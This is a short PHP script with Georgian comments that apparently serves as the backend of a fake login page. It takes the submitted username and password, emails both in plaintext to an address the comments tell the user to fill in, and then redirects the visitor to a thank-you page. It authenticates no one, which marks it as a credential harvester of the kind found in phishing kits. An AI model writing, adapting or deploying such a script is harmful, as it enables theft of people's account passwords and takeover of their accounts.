<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    $to = "შენი_მეილი@example.com";  // <-- ჩაანაცვლე შენი მეილით
    $subject = "ახალი ლოგინის შეტყობინება";
    $message = "მომხმარებელი: " . $username . "\nპაროლი: " . $password;

    $headers = "From: no-reply@yoursite.com\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";

    mail($to, $subject, $message, $headers);

    // გადამისამართება წარმატების გვერდზე (შეგიძლია შექმნა ან შეცვალე)
    header("Location: thankyou.html");
    exit();
}
?>
